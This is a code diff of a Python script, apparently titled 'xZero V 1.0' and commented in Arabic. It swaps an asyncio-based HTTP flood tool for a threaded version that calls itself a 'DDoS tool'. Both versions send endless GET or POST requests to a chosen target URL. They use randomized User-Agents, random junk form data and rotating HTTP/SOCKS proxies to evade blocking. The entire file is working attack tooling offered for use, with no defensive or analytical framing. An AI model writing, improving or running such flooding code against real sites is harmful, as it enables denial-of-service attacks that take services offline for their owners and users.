@@ -1,98 +1,94 @@
-import asyncio
-import aiohttp
+import requests
 import random
-from fake_useragent import UserAgent
-from colorama import Fore, Style
+import threading
+import time
+import argparse
+from fake_useragent import UserAgent  # استيراد مكتبة fake_useragent
 import string
-import os
 
-os.system('clear')
-print(f'''
-{Fore.CYAN}
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣾⣿⣦⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣽⣿⣷⣴⣤⣤⡄⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⣿⣏⣛⣛⣉⣛⡛⠋⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠉⠙⠻⢿⣿⣿⣿⠟⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{Fore.RED} xZero V 1.0
-
-{Style.RESET_ALL}
-''')
-
-# تهيئة User-Agent
+# إنشاء UserAgent من مكتبة fake_useragent
 ua = UserAgent()
 
-# توليد بيانات POST عشوائية
-def random_post_data(length=50):
-    letters = string.ascii_letters + string.digits
-    return {f'param{i}': ''.join(random.choice(letters) for i in range(length)) for i in range(1, 11)}
-
-# هجوم HTTP مع عداد للطلبات الناجحة والفاشلة
-async def http_attack(target, proxy=None, method="GET", headers=None, success_counter=None, failure_counter=None):
-    async with aiohttp.ClientSession() as session:
-        while True:
-            headers = headers or {'User-Agent': str(ua.random)}  # توليد User-Agent عشوائي
-            try:
-                if method.upper() == "POST":
-                    # توليد بيانات POST عشوائية
-                    data = random_post_data()
-                    async with session.post(target, headers=headers, proxy=proxy, data=data) as res:
-                        print(f"{Fore.GREEN} Request sent (POST) | Status: {Fore.YELLOW}{res.status}{Style.RESET_ALL}")
-                        success_counter[0] += 1  # زيادة العداد
-                else:
-                    async with session.get(target, headers=headers, proxy=proxy) as res:
-                        print(f"{Fore.GREEN} Request sent (GET) | Status: {Fore.YELLOW}{res.status}{Style.RESET_ALL}")
-                        success_counter[0] += 1  # زيادة العداد
-
-            except Exception as e:
-                print(f"{Fore.RED}[ ! ] An error occurred: {str(e)}{Style.RESET_ALL}")
-                failure_counter[0] += 1  # زيادة العداد للفشل
-            await asyncio.sleep(0.1)  # تأخير بين الطلبات لتقليل الضغط
-
-async def main(url, threads, proxies, method):
-    success_counter = [0]  # عداد الطلبات الناجحة
-    failure_counter = [0]  # عداد الطلبات الفاشلة
-    tasks = []
-    for _ in range(threads):
-        proxy = random.choice(proxies)  # اختيار بروكسي عشوائي
-        tasks.append(asyncio.create_task(http_attack(url, proxy, method, success_counter, failure_counter)))
-    await asyncio.gather(*tasks)
-
-    # تقرير نهائي
-    print(f"{Fore.CYAN}\n[!] Attack finished!")
-    print(f"{Fore.GREEN}[+] Successful requests: {success_counter[0]}")
-    print(f"{Fore.RED}[-] Failed requests: {failure_counter[0]}{Style.RESET_ALL}")
-
-# تحميل قائمة البروكسيات من ملف
+# قراءة قائمة البروكسيات من ملف .txt
 def load_proxies(file_path):
-    with open(file_path, 'r') as f:
-        return [line.strip() for line in f if line.strip()]
+    with open(file_path, 'r') as file:
+        proxies = [line.strip() for line in file if line.strip()]
+    return proxies
 
-if __name__ == "__main__":
-    url = input(f'''{Fore.CYAN}┌─(xZero)─{Fore.RED}[~ Target]
-{Fore.CYAN}└──╼ ~ ❯ ''')
-    
-    try:
-        threads = int(input(f'''{Fore.CYAN}┌─(xZero)─{Fore.RED}[~ Threads]
-{Fore.CYAN}└──╼ ~ ❯ '''))
-    except ValueError:
-        exit(f"{Fore.CYAN}Threads count is incorrect!")
+# دالة لتوليد بيانات POST عشوائية
+def generate_random_data():
+    random_string = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
+    return {'data': random_string}
 
-    if threads <= 0:
-        exit("Threads count must be greater than 0!")
+# دالة لتنفيذ الهجوم DOS
+def dos(target, method, data=None, proxies_list=None):
+    while True:
+        try:
+            # اختيار User-Agent بشكل عشوائي باستخدام مكتبة fake_useragent
+            user_agent = ua.random
+            headers = {
+                "User-Agent": user_agent
+            }
+            
+            # اختيار بروكسي بشكل عشوائي لكل طلب
+            if proxies_list:
+                proxy = random.choice(proxies_list)
+                if proxy.startswith("socks4://"):
+                    proxy_dict = {
+                        "http": proxy,
+                        "https": proxy
+                    }
+                elif proxy.startswith("socks5://"):
+                    proxy_dict = {
+                        "http": proxy,
+                        "https": proxy
+                    }
+                else:
+                    proxy_dict = {
+                        "http": "http://" + proxy,
+                        "https": "http://" + proxy
+                    }
+            else:
+                proxy_dict = None
 
-    proxies = load_proxies("proxy_list.txt")
-    if not proxies:
-        exit("No proxies found in the file!")
+            # إذا كان الطلب POST، نولد بيانات عشوائية
+            if method == "POST":
+                post_data = generate_random_data()
+                res = requests.post(target, data=post_data, headers=headers, proxies=proxy_dict)
+            else:
+                res = requests.get(target, headers=headers, proxies=proxy_dict)
 
-    # تحديد نوع الطلب
-    method = input(f'''{Fore.CYAN}┌─(xZero)─{Fore.RED}[~ GET / POST]
-{Fore.CYAN}└──╼ ~ ❯ ''').strip().upper()
-    if method not in ["GET", "POST"]:
-        exit("Invalid method! Please choose GET or POST.")
+            print(f"Request sent using {method}! User-Agent: {user_agent}, Proxy: {proxy}")
+        
+        except requests.exceptions.ConnectionError:
+            print("[!!!] Connection error!")
+        except Exception as e:
+            print(f"[!!!] An error occurred: {e}")
 
-    asyncio.run(main(url, threads, proxies, method))
-    
-    
+# استخدام argparse لأخذ المعطيات من سطر الأوامر
+def get_arguments():
+    parser = argparse.ArgumentParser(description="DDoS tool with proxy, user-agent, and POST data support")
+    parser.add_argument("url", help="Target URL")
+    parser.add_argument("-t", "--threads", help="Number of threads", type=int, default=20)
+    parser.add_argument("-m", "--method", help="HTTP method (GET/POST)", choices=["GET", "POST"], default="GET")
+    parser.add_argument("-p", "--proxyfile", help="Path to proxy list file", default=None)
+    args = parser.parse_args()
+    return args
+
+args = get_arguments()
+
+# تحميل البروكسيات إذا تم توفير ملف
+if args.proxyfile:
+    proxies = load_proxies(args.proxyfile)
+else:
+    proxies = None
+
+threads = args.threads
+url = args.url
+method = args.method
+
+# تشغيل الخيوط
+for i in range(threads):
+    thr = threading.Thread(target=dos, args=(url, method, None, proxies))
+    thr.start()
+    print(f"Thread {i + 1} started!")
